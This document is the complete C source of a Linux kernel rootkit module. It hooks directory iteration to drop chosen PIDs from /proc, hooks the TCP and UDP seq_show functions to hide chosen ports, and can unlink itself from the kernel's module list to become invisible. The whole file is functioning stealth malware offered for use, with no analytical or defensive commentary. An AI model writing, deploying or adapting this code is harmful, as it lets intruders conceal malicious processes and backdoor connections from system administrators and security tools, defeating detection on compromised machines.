#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/netdevice.h>
#include <linux/inet_diag.h>
#include <linux/seq_file.h>
#include <linux/ctype.h>
#include <net/tcp.h>
#include <net/udp.h>
#include "shadow.h"

#define MAX_HIDDEN_PIDS 16
#define MAX_HIDDEN_PORTS 16

static char *hide_pids[MAX_HIDDEN_PIDS];
static int hide_pids_count = 0;
static u16 hide_ports[MAX_HIDDEN_PORTS];
static int hide_ports_count = 0;
static int self_hide = 0; /* Default: don't hide the module itself for easier debugging */

module_param_array(hide_pids, charp, &hide_pids_count, 0644);
module_param_array(hide_ports, ushort, &hide_ports_count, 0644);
module_param(self_hide, int, 0644);

/* --- Process Hiding Logic --- */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
typedef bool (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
#else
typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
#endif

static int (*real_iterate_shared)(struct file *, struct dir_context *);
static int (*real_iterate_dir)(struct file *, struct dir_context *);

struct stealth_dir_context {
    struct dir_context ctx;
    struct dir_context *orig_ctx;
    filldir_t orig_actor;
    bool is_proc;
};

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static bool stealth_actor(struct dir_context *ctx, const char *name, int len,
                         loff_t offset, u64 ino, unsigned int d_type)
#else
static int stealth_actor(struct dir_context *ctx, const char *name, int len,
                        loff_t offset, u64 ino, unsigned int d_type)
#endif
{
    struct stealth_dir_context *s_ctx = container_of(ctx, struct stealth_dir_context, ctx);
    int i;

    if (s_ctx->is_proc && len > 0 && isdigit(name[0])) {
        for (i = 0; i < hide_pids_count; i++) {
            if (len == strlen(hide_pids[i]) && strncmp(name, hide_pids[i], len) == 0)
                return true; 
        }
    }

    s_ctx->orig_ctx->pos = ctx->pos;
    return s_ctx->orig_actor(s_ctx->orig_ctx, name, len, offset, ino, d_type);
}

static int fake_iterate_common(struct file *file, struct dir_context *ctx, 
                               int (*real_func)(struct file *, struct dir_context *))
{
    int ret;
    struct stealth_dir_context s_ctx = {
        .ctx.actor = stealth_actor,
        .orig_ctx = ctx,
        .orig_actor = ctx->actor,
        .is_proc = false,
    };

    if (file && file->f_path.dentry && file->f_path.dentry->d_sb) {
        const char *fs_name = file->f_path.dentry->d_sb->s_type->name;
        if (strcmp(fs_name, "proc") == 0) {
            s_ctx.is_proc = true;
        }
    }

    if (!s_ctx.is_proc) {
        return real_func(file, ctx);
    }

    s_ctx.ctx.pos = ctx->pos;
    ret = real_func(file, &s_ctx.ctx);
    ctx->pos = s_ctx.ctx.pos;
    return ret;
}

static int fake_iterate_shared(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_shared);
}

static int fake_iterate_dir(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_dir);
}

/* --- Network Hiding Logic --- */

static int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*real_udp4_seq_show)(struct seq_file *seq, void *v);

static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    int i;

    if (v == SEQ_START_TOKEN)
        return real_tcp4_seq_show(seq, v);

    for (i = 0; i < hide_ports_count; i++) {
        if (sk->sk_num == hide_ports[i])
            return 0;
    }

    return real_tcp4_seq_show(seq, v);
}

static int fake_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    int i;

    if (v == SEQ_START_TOKEN)
        return real_udp4_seq_show(seq, v);

    for (i = 0; i < hide_ports_count; i++) {
        if (sk->sk_num == hide_ports[i])
            return 0;
    }

    return real_udp4_seq_show(seq, v);
}

/* --- Module Self-Hiding --- */

static struct list_head *prev_module = NULL;

static void hide_module(void)
{
    if (prev_module) return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void show_module(void)
{
    if (!prev_module) return;
    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
}

/* --- Module Setup --- */

static struct ftrace_hook process_hooks[] = {
    { .name = "iterate_shared", .function = fake_iterate_shared, .original = &real_iterate_shared },
    { .name = "iterate_dir", .function = fake_iterate_dir, .original = &real_iterate_dir },
};

static struct ftrace_hook network_hooks[] = {
    { .name = "tcp4_seq_show", .function = fake_tcp4_seq_show, .original = &real_tcp4_seq_show },
    { .name = "udp4_seq_show", .function = fake_udp4_seq_show, .original = &real_udp4_seq_show },
};

static int __init stealth_init(void)
{
    int err;
    int i;
    int process_hook_count = 0;

    err = resolve_ftrace_functions();
    if (err) return err;

    for (i = 0; i < ARRAY_SIZE(process_hooks); i++) {
        err = fh_install_hook(&process_hooks[i]);
        if (err == 0) {
            process_hook_count++;
        } else {
            pr_warn("Failed to install hook for %s, skipping...\n", process_hooks[i].name);
        }
    }

    if (process_hook_count == 0) {
        pr_err("Failed to install any process hiding hooks. Aborting.\n");
        return -ENOENT;
    }

    err = fh_install_hooks(network_hooks, ARRAY_SIZE(network_hooks));
    if (err) {
        pr_warn("Failed to install network hooks, network hiding will be disabled.\n");
    }
    
    if (self_hide) {
        hide_module();
        pr_info("Stealth module loaded in HIDDEN mode.\n");
    } else {
        pr_info("Stealth module loaded in VISIBLE mode.\n");
    }
    
    pr_info("Hiding %d PIDs and %d ports\n", hide_pids_count, hide_ports_count);
    return 0;
}

static void __exit stealth_exit(void)
{
    int i;
    if (self_hide) {
        show_module();
    }

    for (i = 0; i < ARRAY_SIZE(process_hooks); i++) {
        if (process_hooks[i].address)
            fh_remove_hook(&process_hooks[i]);
    }

    fh_remove_hooks(network_hooks, ARRAY_SIZE(network_hooks));
    
    pr_info("Stealth module unloaded\n");
}

module_init(stealth_init);
module_exit(stealth_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("test");
MODULE_DESCRIPTION("LKM for hiding processes and network connections on Linux 5.15/6.8");